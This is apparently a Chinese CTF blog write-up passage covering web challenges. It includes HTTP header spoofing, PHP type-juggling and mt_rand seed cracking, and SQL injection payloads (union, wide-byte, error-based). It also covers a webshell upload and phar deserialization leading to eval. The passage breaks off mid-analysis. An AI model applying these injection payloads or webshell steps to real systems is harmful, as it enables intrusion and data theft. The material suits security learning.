<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>做了这个这么多题，按照难易度，猜着大概是个伪造<br>首先在源码看到了  <code>href=&quot;Secret.php&quot;</code><br>点开跳转后，网页回显</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;</span><br></pre></td></tr></table></figure></div>

<p> Bp 拦截改一下，加个 <code>referer</code> 头</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure></div>

<p>然后多了新的要求</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure></div>

<p>再改一下 <code>User-Agent: Syclover</code></p>
<p>怎么这么多事呢</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure></div>

<p>加个 <code>X-Forwarded-For: 127.0.0.1</code><br>然后拿到了 flag</p>
<hr>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>进入类似的网页，源码中找到了 <code>href=&quot;pay.php&quot;</code><br>然后页面出现了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ATTENTION</span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br><span class="line"></span><br><span class="line">Only Cuit&#x27;s students can buy the FLAG</span><br></pre></td></tr></table></figure></div>

<p>在源码找到了这个</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单的绕过，然后构造payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">password</span>=<span class="number">404</span>a&amp;money[]=<span class="number">1</span></span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020安恒杯丨新春祈福赛</title>
    <url>/yakko117/2020/01/28/%E5%AE%89%E6%81%922020%E6%96%B0%E6%98%A5%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://www.linkedbyx.com/">安恒题目链接</a></p>
<h1 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h1><p>php伪随机爆破</p>
<p>进入页面，回显说猜字符串游戏(大小写字母+数字)，猜中全部20位得flag，然后给出了前十位，查看源码，发现了 <code>check.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cIbLnJQhrp</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>发现 <code>mt_scrand()</code>，<code>mt_rand()</code> 函数和 <code>session</code> 都是用的随机数设置</p>
<p>利用<a href="https://www.openwall.com/php_mt_seed/">爆破工具</a>和脚本获得随机数，进行爆破</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;cIbLnJQhrp&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> (res)</span><br></pre></td></tr></table></figure></div>

<p>得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 2 0 61 44 44 0 61 1 1 0 61 47 47 0 61 13 13 0 61 45 45 0 61 52 52 0 61 7 7 0 61 17 17 0 61 15 15 0 61</span><br></pre></td></tr></table></figure></div>

<p>利用工具爆破<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrt6abj30ki0ciq4j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrt6abj30ki0ciq4j.jpg" class="lazyload"></a></p>
<p>然后将得到的随机session值，放于脚本，得到密码，输入后得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">314836512</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;test.php&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h1><p>刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</p>
<p>点开题目链接，尝试使用注入</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or &#x27;1=1&#x27;#</span><br></pre></td></tr></table></figure></div>

<p>跳转页面提示 <code>wrong pass</code>，看源代码，发现一段奇怪的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br><span class="line"></span><br><span class="line">base32 解码得到</span><br><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw<span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">base64 解码得到</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>一开始利用sqlmap跑出3个column，<code>id</code>， <code>username</code>， <code>password</code></p>
<p>注出密码 <code>cdc9c819c7f8be2628d4180669009d28</code> 大概是个md5</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27; And 1&gt;2 union select &#x27;1&#x27;, &#x27;2&#x27;, &#x27;admin&#x27;,&#x27;d41a28db4e476e31a13d6596200f4787&amp;pw=yakko</span><br><span class="line"></span><br><span class="line">Error: The used SELECT statements have a different number of columns</span><br><span class="line"></span><br><span class="line">然后推断 分别问 id username md5加密的password </span><br><span class="line">提交payload，得到flag</span><br><span class="line">name=admin&#x27; And 1&gt;2 union select &#x27;1&#x27;, &#x27;admin&#x27;,&#x27;d41a28db4e476e31a13d6596200f4787&amp;pw=yakko</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h1><p>我对网站进行了加固，还支持了中文账号，这下你们没辙了吧？</p>
<p><a href="http://blog.sina.com.cn/s/blog_1669853c90102xk7k.html">php代码审计之绕过addslashes()函数的几种情况</a><br><a href="https://blog.csdn.net/qq_39101049/article/details/88839514">sql基于 extractvalue()，floor()，updatexml()函数的报错注入</a></p>
<p>开始只要输入 <code>admin</code>，都能进去，看到回显</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL:name=admin&amp;pw=admin</span><br><span class="line">Congratulations!admin</span><br><span class="line">Your pass is cdc9c819c7f8be2628d4180669009d28</span><br><span class="line">但是这里没有flag呀！</span><br><span class="line"></span><br><span class="line">URL:name=admin&amp;pw[]=admin</span><br><span class="line">Warning: md5() expects parameter 1 to be string, array given in /var/www/html/search.php on line32</span><br><span class="line"></span><br><span class="line">URL: name[]=admin&amp;pw=admin</span><br><span class="line">Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/search.php on line 25</span><br><span class="line"></span><br><span class="line">Warning: addslashes() expects parameter 1 to be string, array given in /var/www/html/search.php on line 28</span><br><span class="line"></span><br><span class="line">URL: name=admin%df&#x27;&amp;pw=admin</span><br><span class="line"></span><br><span class="line">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin�\&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure></div>

<p>然后照着上面链接套，最后把得到的字符串 <code>base64 解密</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select where 都被过滤了 双写绕过就好了</span><br><span class="line"></span><br><span class="line">name=%df&#x27;and(seselectlect 1 from(sselectelect count(*),concat((sselectelect (SESELECTLECT  concat(327a6c4304ad5938eaf0efb6cc3e53dc) FROM f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;pw=admin</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Babysqliv3-0"><a href="#Babysqliv3-0" class="headerlink" title="Babysqliv3.0"></a>Babysqliv3.0</h1><p>这次我可是绝对防御! </p>
<p>弱口令：admin &#x2F; password</p>
<h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload.php?name=/var/www/html/uploads/yakko12.php</span><br></pre></td></tr></table></figure></div>

<p>然后尝试上传一句话的txt，然后挂菜刀就好了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrlvrbj30ex051gls.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrlvrbj30ex051gls.jpg" class="lazyload"></a></p>
<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>首先看一下不同的回显</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">home.php?file=upload</span><br><span class="line">正常回显</span><br><span class="line"></span><br><span class="line">home.php?file=flag.php </span><br><span class="line">Hacker!</span><br><span class="line"></span><br><span class="line">home.php?file=index.php</span><br><span class="line">当前引用的是 index.php.fxxkyou!</span><br></pre></td></tr></table></figure></div>

<p>若包含的文件以 <code>home</code> 或 <code>upload</code> 结尾<br>则在后面拼接上 <code>.php</code> 后包含；其他都被拼接上 <code>.fxxkyou!</code></p>
<p>但是伪协议没有被waf， 尝试读一下代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">但是只能得到upload 和 home 的源代码</span><br><span class="line">home.php?file=php://filter/read=convert.base64-encode/resource=upload</span><br></pre></td></tr></table></figure></div>

<h3 id="Upload-php"><a href="#Upload-php" class="headerlink" title="Upload.php"></a>Upload.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>首先看到这个</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br></pre></td></tr></table></figure></div>

<p>可见 <code>$this-&gt;Filename</code> 是可控的，可以通过 <code>name参数</code> 以 <code>get</code> 方式得到<br>然后跟踪到后面的上传部分</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>file_get_contents()</code> 使 <code>$uploader</code> 对象通过<code>__toString()</code> 返回 <code>$this-&gt;Filename</code>，由于 <code>phar://伪协议</code> 可以不依赖 <code>unserialize()</code>直接进行反序列化操作，加之 <code>$this-&gt;Filename</code>可控，因此此处 <code>$this-&gt;Filename</code> 配合<code>phar反序列化</code>后，<code>__destruct()方法</code> 内 <code>eval($this-&gt;cmd)</code>；最终导致了远程代码执行</p>
<p>由于 <code>__destruct()</code> 方法中，想要 <code>eval($this-&gt;cmd)</code>； 的前提条件是 <code>$this-&gt;token</code> 和 <code>$_SESSION[&#39;user&#39;]</code> 相等</p>
<p>在 <code>__construct()</code> 方法中可见如下代码</p>
